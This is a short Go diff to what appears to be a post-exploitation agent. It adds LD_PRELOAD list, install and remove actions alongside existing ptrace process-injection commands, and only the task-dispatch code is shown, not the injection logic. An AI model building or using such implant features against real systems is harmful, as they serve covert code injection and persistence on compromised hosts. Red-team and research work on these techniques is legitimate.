@@ -50,8 +50,22 @@ func (c *PtraceInjectCommand) Execute(task structs.Task) structs.CommandResult {
 		return ptraceCheck()
 	case "inject":
 		return ptraceInject(args)
+	case "ld-preload":
+		return ldPreloadList()
+	case "ld-install":
+		var ldArgs ldPreloadArgs
+		if err := json.Unmarshal([]byte(task.Params), &ldArgs); err != nil {
+			return errorf("Error parsing ld-preload parameters: %v", err)
+		}
+		return ldPreloadInstall(ldArgs)
+	case "ld-remove":
+		var ldArgs ldPreloadArgs
+		if err := json.Unmarshal([]byte(task.Params), &ldArgs); err != nil {
+			return errorf("Error parsing ld-preload parameters: %v", err)
+		}
+		return ldPreloadRemove(ldArgs)
 	default:
-		return errorf("Unknown action: %s\nAvailable: check, inject", args.Action)
+		return errorf("Unknown action: %s\nAvailable: check, inject, ld-preload, ld-install, ld-remove", args.Action)
 	}
 }
 
